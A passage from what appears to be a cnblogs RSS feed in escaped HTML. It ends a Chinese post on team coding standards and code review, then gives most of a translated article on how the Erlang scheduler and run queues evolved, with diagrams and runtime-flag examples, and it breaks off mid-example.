&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;如果把这些规范改成下面这样，或许更能容易执行一点：&lt;/p&gt;

&lt;div&gt;
&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;/colgroup&gt;&lt;tbody readability=&quot;1.5&quot;&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td data-cell-id=&quot;5683-1517906063565-cell-0-0&quot; readability=&quot;11&quot;&gt;
&lt;p&gt;1. 变量不超过5个单词。&lt;/p&gt;
&lt;p&gt;2. 变量名要表达出变量的用途。&lt;/p&gt;
&lt;p&gt;3. 函数体不要超过50行，函数复杂度不要超过10。&lt;/p&gt;
&lt;p&gt;4. 类的公开成员不要超过20。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第二点，规范应该具有实用性。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;至于实用性上，四代认同代码规范不易太长，可以采用很多人建议的那样，就搞个”程序员节操15条“，选取你认为团队中最需要实行的15条放到里面就可以了。比如四代就会选择如下一些简单易行的一些规则：&lt;/p&gt;

&lt;div&gt;
&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;col/&gt;&lt;col/&gt;&lt;/colgroup&gt;&lt;tbody readability=&quot;11&quot;&gt;&lt;tr&gt;&lt;td data-cell-id=&quot;6030-1517906063595-cell-0-0&quot;&gt;
&lt;p&gt;元素类型&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-0-1&quot;&gt;
&lt;p&gt;命名规范&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-0-2&quot;&gt;
&lt;p&gt;实现规范&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td data-cell-id=&quot;6030-1517906063595-cell-1-0&quot;&gt;
&lt;p&gt;通用命名&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-1-1&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;使用英文单词&lt;/p&gt;
&lt;p&gt;表达出变量用途&lt;/p&gt;
&lt;p&gt;不加变量类型&lt;/p&gt;
&lt;p&gt;不使用缩写&lt;/p&gt;
&lt;p&gt;本地变量采用小驼峰命名&lt;/p&gt;
&lt;p&gt;函数和类型采用大驼峰命名&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-1-2&quot;&gt; &lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td data-cell-id=&quot;6030-1517906063595-cell-2-0&quot;&gt;
&lt;p&gt;表达式&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-2-1&quot;&gt; &lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-2-2&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;语句体即使只有一句也不省略{}&lt;/p&gt;
&lt;p&gt;if语句中的条件表达式的逻辑运算不要超过3个&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td data-cell-id=&quot;6030-1517906063595-cell-3-0&quot;&gt;
&lt;p&gt;函数&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-3-1&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;以“动词”或者“动词+名词”组合&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-3-2&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;参数不多于5个&lt;/p&gt;
&lt;p&gt;函数体不超过30行 (不含空行)&lt;/p&gt;
&lt;p&gt;函数复杂度不超过7&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;16.5&quot;&gt;&lt;td data-cell-id=&quot;6030-1517906063595-cell-4-0&quot;&gt;
&lt;p&gt;类&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-4-1&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;类和属性以“名词”或者“形容词+名词”的方式命名&lt;/p&gt;
&lt;p&gt;类实例变量以“m_”开头，静态变量以“s_”开头，后面部分使用小驼峰命名&lt;/p&gt;
&lt;p&gt;交互型控件变量结尾需加控件类型全称&lt;/p&gt;
&lt;p&gt;类常量/只读变量不加前缀且使用大驼峰命名&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-4-2&quot; readability=&quot;11&quot;&gt;
&lt;p&gt;类的成员函数(包括普通函数，索引，属性)全部参照函数的规范&lt;/p&gt;
&lt;p&gt;类不允许有非常量的公开字段，如果确实需要则用属性代替&lt;/p&gt;
&lt;p&gt;类公开成员不超过15个&lt;/p&gt;
&lt;p&gt;类不超过800行 (所有行)&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td data-cell-id=&quot;6030-1517906063595-cell-5-0&quot;&gt;
&lt;p&gt;接口&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-5-1&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;以“I”开头，以“形容词”或“名词”命名&lt;/p&gt;
&lt;/td&gt;
&lt;td data-cell-id=&quot;6030-1517906063595-cell-5-2&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;接口的成员不超过5个&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;


&lt;p&gt;就这些，不管是重构还是正常写代码都用得上，姑且也把这些规则称为”程序员的节操“吧，呵呵，这可是程序员的底线啊。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第三点，规范应该具有时效性。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;随着时间的不断推进，随着团队成员水平的不断提高，大家可以不断的修订这个规范的内容，比如每年一次，与时俱进嘛！&lt;/p&gt;

&lt;p&gt;四代初步的规划是每年年初修订一次，不求完美，但求符合团队的实际情况。这个不需要多说了，一潭死水最容易臭掉，一切缺少发展特征的事物最终都会死掉，被淘汰，这是伟大的自然辩证法告诉我们的！在大学几年中，自然辩证法和哲学是四代认为最重要的课了，也同样没有“之一”！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第四点，规范应该是大家一致认同的。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;规范是整个团队代码提交的准则，所以只有大家一致从心里认同了，大家才会始终贯彻它们。&lt;/p&gt;

&lt;p&gt;四代非常重视这一点，当后来规范建立起来以后，四代先是让团队中的所有人试着执行了几个月，然后才正式的和所有的成员讨论了规范中的所有细节，解答大家的疑惑，征求大家的意见，最终形成了当年执行的版本。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;代码审查那些事&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;有了代码规范了，大部分人可能会认为，这下代码审查的时候终于可以有话说了。不过四代个人觉得代码规范更多的是大家自检的项目，除了团队新人需要提醒一下外，基本上不需要别人太操心。&lt;/p&gt;
&lt;div&gt; &lt;img src=&quot;https://images2017.cnblogs.com/blog/109061/201802/109061-20180207192602545-926118894.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;

&lt;p&gt;代码审查，这个大家同样都是点赞的，姑且不管效果有多明显，反正大家都觉得这个玩意儿有用，大概原因有如下一些：&lt;/p&gt;

&lt;div&gt;
&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;/colgroup&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;10.5&quot;&gt;&lt;td data-cell-id=&quot;9590-1517906063601-cell-0-0&quot; readability=&quot;14&quot;&gt;
&lt;p&gt;1. 代码审查能避免一些低级的错误，比如拼写错误，比如简单的逻辑错误等。&lt;/p&gt;
&lt;p&gt;2. 代码审查能使得大家互相学习一些新的知识。&lt;/p&gt;
&lt;p&gt;3. 代码审查能多熟悉一些代码。&lt;/p&gt;
&lt;p&gt;4. 代码审查能避免一些对方代码的失误而影响到自己的功能。&lt;/p&gt;
&lt;p&gt;5. 代码审查能寻找到更加优化的方案。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;


&lt;p&gt;但是一到实际的项目中，就会有各种问题导致不能贯彻执行下去，比如下面这些理由：&lt;/p&gt;

&lt;div&gt;
&lt;table&gt;&lt;colgroup&gt;&lt;col/&gt;&lt;/colgroup&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;11.5&quot;&gt;&lt;td data-cell-id=&quot;5125-1517906063607-cell-0-0&quot; readability=&quot;16&quot;&gt;
&lt;p&gt;1. 时间不够&lt;/p&gt;
&lt;p&gt;“哥啊，软件开发任务多的做不过来，那还有时间做代码审查？这不是代码审查好不好的问题，而是我没时间做啊！”&lt;/p&gt;
&lt;p&gt;2. 需求变化&lt;/p&gt;
&lt;p&gt;“需求变得太快，代码的生存周期比较短，不需要好的代码，反正过两天这些代码就可能会被废弃了！”&lt;/p&gt;
&lt;p&gt;3. 态度问题&lt;/p&gt;
&lt;p&gt;“别人的代码，我又不懂，怎么审查啊！而且就算是自己写的，写好就行啦，干嘛精益求精啊！”&lt;/p&gt;
&lt;p&gt;4. 结果最重要&lt;/p&gt;
&lt;p&gt;“大佬们都说了，能运行的代码最重要了，要那么漂亮干什么！”&lt;/p&gt;
&lt;p&gt;5. 能力不足&lt;/p&gt;
&lt;p&gt;“不好意思啊，我们都不知道怎么做代码审查啊！”&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;乖乖，总结一下都能写一篇论文。但是不管怎么样，四代根据团队实施代码审查的过程，觉得有几点是值得大家深入思考的：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第一点，任何提交到代码库的代码必须是经过代码审查的。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这个不用多说了吧，既然代码审查那么的重要，无论时间多么的紧迫，谨慎一点都是必要的，尤其是对一些发布流程比较长，发布成本比较高的产品，如PC团队研发的桌面版软件。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第二点，代码审查不仅仅检查那些代码规范，还要检查代码的逻辑是否合理。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;虽然很多时候，代码审查并不能如想象的那样，发现代码的很多问题，但是代码审查会提升程序员的编程态度。试想如果一个人知道将会有同事检查他的代码，他编程态度就绝对会不一样的。他写出的代码将更加整洁，有更好的注释，更好的程序结构，因为他知道，大家将会查看他的程序。&lt;/p&gt;

&lt;div readability=&quot;14&quot;&gt;
&lt;p&gt;在代码审查中最常犯的错误几乎每个新手都会犯的错误是，审查者根据自己的编程习惯来评判别人的代码（当然，基本的代码规范是需要大家共同遵守的，哈哈）。&lt;/p&gt;

&lt;p&gt;对于一个问题，通常大家能找出十几种方法去解决。对于一种解决方案，大家能有百万种编码方案来实现它。做代码审查的时候，审查者的任务不是来确保被审查的代码都采用的是自己习惯的编码方式，因为大部分情况下，它不可能跟你自己写的一样。作为一段代码的审查者的任务是确保由作者自己写出的代码是正确的。&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第三点，代码审查不一定非要说些什么。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div readability=&quot;10&quot;&gt;
&lt;p&gt;代码审查经常易犯的毛病是，人们觉得有压力，感觉非要说点什么才好。当审查者知道作者用了大量的时间和精力来实现这些程序，不该说点什么吗？不，大部分时候并不需要。大部分时候，只说一句：“哇，不错呀”，会非常合适。&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第四点，代码审查要坚持执行，一定不要敷衍。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;没有什么事情能简单的做下来的。依四代的经验，在团队能正确的进行代码审查前，大家是需要花时间学习和实践的。人们在代码审查时经常会犯一些错误，导致不少麻烦，尤其在一些缺乏经验的审查者中经常的出现。他们给了人们一个很遭的代码审查的体验，成为了人们接受代码审查制度的一个障碍。&lt;/p&gt;

&lt;p&gt;代码规范和代码审查是PC团队最重要的几件事之一，从规范讨论的那天起，四代就征求了鼬关于这件事的意见，他们经历过入职后修改部分代码的痛苦的经历后，一致认为这么做非常有必要，于是，就在某个月黑风高的夜晚，它终于被正式实施了。&lt;/p&gt;

</description>
<pubDate>Wed, 07 Feb 2018 11:50:00 +0000</pubDate>
<dc:creator>沙场秋点兵</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dxy1982/p/8427805.html</dc:identifier>
</item>
<item>
<title>Erlang调度器细节探析 - racaljk</title>
<link>http://www.cnblogs.com/racaljk/p/8428050.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/racaljk/p/8428050.html</guid>
<description>&lt;p&gt;Erlang的很多基础特性使得它成为一个软实时的平台。其中包括垃圾回收机制，详细内容可以参见我的上一篇文章&lt;a href=&quot;https://hamidreza-s.github.io/erlang%20garbage%20collection%20memory%20layout%20soft%20realtime/2015/08/24/erlang-garbage-collection-details-and-why-it-matters.html&quot;&gt;Erlang Garbage Collection Details and Why It Matters&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是调度&quot;&gt;什么是调度&lt;/h2&gt;
&lt;p&gt;一般来说，&lt;strong&gt;调度&lt;/strong&gt;是一种将&lt;strong&gt;工作&lt;/strong&gt;分配给&lt;strong&gt;工作者&lt;/strong&gt;的机制。这些&lt;strong&gt;工作&lt;/strong&gt;可以是数学运算，字符串处理，数据提取，&lt;strong&gt;工作者&lt;/strong&gt;指的是类似于&lt;a href=&quot;https://en.wikipedia.org/wiki/Green_threads&quot;&gt;Green Threads&lt;/a&gt;或者&lt;a href=&quot;https://en.wikipedia.org/wiki/Green_threads&quot;&gt;原生线程&lt;/a&gt;等这种资源。&lt;strong&gt;调度器&lt;/strong&gt;就是执行调度任务的程序，它在某种程度上提供：最大化吞吐，公平执行，最小化响应时间和最小化延时。调度是多任务操作系统/虚拟机的主要部分。它分为两种：&lt;/p&gt;
&lt;ol readability=&quot;1&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;抢占式：抢占式调度器在所有运行任务中切换上下文，并且有权利抢占（中断）任务执行并稍后恢复执行而不需要被强占的任务配合。它基于优先级，时间切片，reduction技术。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;协作式：协作式调度器在进行上下文切换时需要任务的配合。在这种调度模式下调度器让运行的任务周期性主动释放控制权或者在idle状态时主动释放，然后开始执行新任务，等待新任务自发返回控制权。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;现在的问题是哪种调度方式适合必须在限定时间内响应的实时系统。协作式调度不能满足要求，因为实时系统中的运行任务可能永远不会在限定时间内主动释放控制权或者返回。所以实时系统通常使用抢占式调度。&lt;/p&gt;
&lt;h2 id=&quot;erlang调度&quot;&gt;Erlang调度&lt;/h2&gt;
&lt;p&gt;Erlang作为实时多任务平台，它使用抢占式调度。Erlang调度器的职责是选择一个&lt;a href=&quot;http://erlang.org/doc/reference_manual/processes.html&quot;&gt;Process&lt;/a&gt;然后执行它的代码。它也负责垃圾回收和内存管理。如何选择process取决于它们的优先级，每个process的优先级都是可配置的。对于每个优先级，多个process轮询调度。另一方面，抢占一个process取决于它最后一次执行到目前的确定数目的reductions操作，而不管优先级。reductions是每个线程的计数器，如果有函数调用就增加计数。当该计数器到达&lt;code&gt;max reduction&lt;/code&gt;，调度器就会抢占process并切换上下文。在&lt;code&gt;Erlang/OTP R12B&lt;/code&gt;中，&lt;code&gt;max reduction&lt;/code&gt;是&lt;code&gt;2000&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;Erlang调度机制有很长的历史，历经数次改变。这些改变也受Erlang中对称多线程(SMP)特性的影响。&lt;/p&gt;
&lt;h2 id=&quot;erlang-r11b之前的调度&quot;&gt;Erlang R11B之前的调度&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;R11B&lt;/code&gt;版本之前，Erlang不支持SMP,只有一个调度器运行在OS进程中的线程，也只有一个&lt;strong&gt;Run Queue&lt;/strong&gt;。调度器从&lt;strong&gt;run queue&lt;/strong&gt;中选择可运行的process或I/O任务执行。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;                         Erlang 虚拟机
+--------------------------------------------------------+
|                                                        |
|  +-----------------+              +-----------------+  |
|  |                 |              |                 |  |
|  |    Scheduler    +--------------&amp;gt;     Task # 1    |  |
|  |                 |              |                 |  |
|  +-----------------+              |     Task # 2    |  |
|                                   |                 |  |
|                                   |     Task # 3    |  |
|                                   |                 |  |
|                                   |     Task # 4    |  |
|                                   |                 |  |
|                                   |     Task # N    |  |
|                                   |                 |  |
|                                   +-----------------+  |
|                                   |                 |  |
|                                   |    Run Queue    |  |
|                                   |                 |  |
|                                   +-----------------+  |
|                                                        |
+--------------------------------------------------------+&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这种实现不需要锁数据结构但是老旧代码不能享受新处理器并行快餐。&lt;/p&gt;
&lt;h2 id=&quot;erlang-r11br12b-的调度&quot;&gt;Erlang R11B/R12B 的调度&lt;/h2&gt;
&lt;p&gt;在这两个版本中由于SMP的加入，OS进程的一个线程可以运行1-1024个调度器。然而，这个版本的调度器从公共&lt;strong&gt;run queue&lt;/strong&gt;选择可运行任务而不像之前那样只有一个&lt;strong&gt;run queue&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;   Erlang 虚拟机
+--------------------------------------------------------+
|                                                        |
|  +-----------------+              +-----------------+  |
|  |                 |              |                 |  |
|  |  Scheduler # 1  +--------------&amp;gt;     Task # 1    |  |
|  |                 |    +---------&amp;gt;                 |  |
|  +-----------------+    |    +----&amp;gt;     Task # 2    |  |
|                         |    |    |                 |  |
|  +-----------------+    |    |    |     Task # 3    |  |
|  |                 |    |    |    |                 |  |
|  |  Scheduler # 2  +----+    |    |     Task # 4    |  |
|  |                 |         |    |                 |  |
|  +-----------------+         |    |     Task # N    |  |
|                              |    |                 |  |
|  +-----------------+         |    +-----------------+  |
|  |                 |         |    |                 |  |
|  |  Scheduler # N  +---------+    |    Run Queue    |  |
|  |                 |              |                 |  |
|  +-----------------+              +-----------------+  |
|                                                        |
+--------------------------------------------------------+&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于并行的加入，所有的共享数据结构都被锁保护。&lt;strong&gt;run queue&lt;/strong&gt;它自身是一个共享数据结构，必须锁住。虽然锁会造成性能惩罚(performance penalty)，但是在多核处理器上运行性能有所提升。&lt;/p&gt;
&lt;p&gt;这个版本有一些已知的性能瓶颈：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当调度器数目增加时公共&lt;strong&gt;run queue&lt;/strong&gt;会成为一个瓶颈&lt;/li&gt;
&lt;li&gt;对涉及锁的ETS tables操作会影响Mnesia&lt;/li&gt;
&lt;li&gt;当很多process向一个process发送消息会增加锁冲突几率&lt;/li&gt;
&lt;li&gt;process等待锁会阻塞它的调度器&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;然而，在下个版本可以看到，为每个调度器创建一个&lt;strong&gt;run queue&lt;/strong&gt;解决了上述问题。&lt;/p&gt;
&lt;h2 id=&quot;erlang-r13b-的调度&quot;&gt;Erlang R13B 的调度&lt;/h2&gt;
&lt;p&gt;在这个版本中每个调度器有一个&lt;strong&gt;run queue&lt;/strong&gt;。它大大降低了多核系统上锁冲突的几率，也提高了总体的性能&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;   Erlang虚拟机
+--------------------------------------------------------+
|                                                        |
|  +-----------------+-----------------+                 |
|  |                 |                 |                 |
|  |  Scheduler # 1  |  Run Queue # 1  &amp;lt;--+              |
|  |                 |                 |  |              |
|  +-----------------+-----------------+  |              |
|                                         |              |
|  +-----------------+-----------------+  |              |
|  |                 |                 |  |              |
|  |  Scheduler # 2  |  Run Queue # 2  &amp;lt;----&amp;gt; Migration  |
|  |                 |                 |  |     Logic    |
|  +-----------------+-----------------+  |              |
|                                         |              |
|  +-----------------+-----------------+  |              |
|  |                 |                 |  |              |
|  |  Scheduler # N  |  Run Queue # N  &amp;lt;--+              |
|  |                 |                 |                 |
|  +-----------------+-----------------+                 |
|                                                        |
+--------------------------------------------------------+&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在访问&lt;strong&gt;run queue&lt;/strong&gt;导致锁冲突的几率大大降低，但也引入了新议题：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;run queue&lt;/strong&gt;的任务划分对于process来说公平吗&lt;/li&gt;
&lt;li&gt;如果一个process超负荷另一个idle怎么办&lt;/li&gt;
&lt;li&gt;调度器应该基于什么顺序来将超负荷的任务转移&lt;/li&gt;
&lt;li&gt;如果我们运行很多调度器但是只有少量任务怎么办&lt;br/&gt;这些人们关心的议题使得Erlang开发团队引入新概念使得调度公平高效，即&lt;strong&gt;Migration Logic&lt;/strong&gt;。它基于之前搜集的统计信息来控制&lt;strong&gt;run queue&lt;/strong&gt;任务数，使其保持相对平衡。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;然而，我们不应该依赖于调度控制&lt;strong&gt;run queue&lt;/strong&gt;，因为很可能后续版本会有所改变。&lt;/p&gt;
&lt;h2 id=&quot;控制和监控api&quot;&gt;控制和监控API&lt;/h2&gt;
&lt;p&gt;这里是一些&lt;strong&gt;Erlang&lt;/strong&gt;模拟器的&lt;strong&gt;flag&lt;/strong&gt;，它也可以控制/监控虚拟机内部调度行为。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;调度线程&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;在启动erlang模拟器时，可以通过flag传递两个由冒号(:)分离的数字来指定&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ erl +S MaxAvailableSchedulers:OnlineSchedulers&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最大可用调度线程数只能在启动时指定，但online调度线程数既可以在启动时指定也可以在运行时改变。&lt;br/&gt;比如，我们可以启动16个可用调度线程，8个online调度线程。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ erl +S 16:8&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后像下面一样调用函数改变online线程数目&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode erlang&quot;&gt;
&lt;code class=&quot;sourceCode erlang&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:system_info(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;schedulers&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; returns 16&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:system_info(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;schedulers_online&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; returns 8&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:system_flag(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;schedulers_online&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; returns 8&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:system_info(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;schedulers_online&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; returns 16&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;另外，使用&lt;code&gt;+SP&lt;/code&gt;flag可以按百分比设置。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;process优先级&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;正如我之前说的，调度器选择process执行取决于优先级，这个优先级可以由&lt;code&gt;erlang:process_flag/2&lt;/code&gt;指定&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode erlang&quot;&gt;
&lt;code class=&quot;sourceCode erlang&quot;&gt;&lt;span class=&quot;dt&quot;&gt;PID&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;spawn(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;fun&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;-&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;fu&quot;&gt;process_flag(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ch&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;),&lt;/span&gt;
   &lt;span class=&quot;co&quot;&gt;%% ...&lt;/span&gt;
   &lt;span class=&quot;kw&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;优先级可以是&lt;code&gt;low | normal | high | max&lt;/code&gt;之一。默认优先级是&lt;code&gt;normal&lt;/code&gt;。&lt;code&gt;max&lt;/code&gt;为erlang运行时保留，用户不应该使用它。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;run queue&lt;/strong&gt;信息统计&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;之前说到&lt;strong&gt;run queue&lt;/strong&gt;存放可以执行的process，等待调度器选择。现在可以调用&lt;code&gt;erlang:statistics(run_queue)&lt;/code&gt;获取&lt;strong&gt;run queue&lt;/strong&gt;中所有可以执行的process的数目。举个实际的例子，我们启动erlang模拟器，指定4个online调度线程，分配10个CPU密集的process并发执行，任务可以考虑&lt;a href=&quot;https://gist.github.com/hamidreza-s/9e3ed289f65759048875&quot;&gt;计算素数个数&lt;/a&gt;。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;15&quot;&gt;
&lt;pre class=&quot;sourceCode erlang&quot;&gt;
&lt;code class=&quot;sourceCode erlang&quot;&gt;&lt;span class=&quot;co&quot;&gt;%% Everything is clean and ready&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:statistics(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;online_schedulers&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; 4&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:statistics(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;run_queue&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; 0&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;%% Spawn 10 heavy number crunching processes concurrently&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;[spawn(&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;fun&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;calc:prime_numbers(&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;10000000&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;lists:seq(&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;)].&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;%% Run queues have remaining tasks to do&lt;/span&gt;
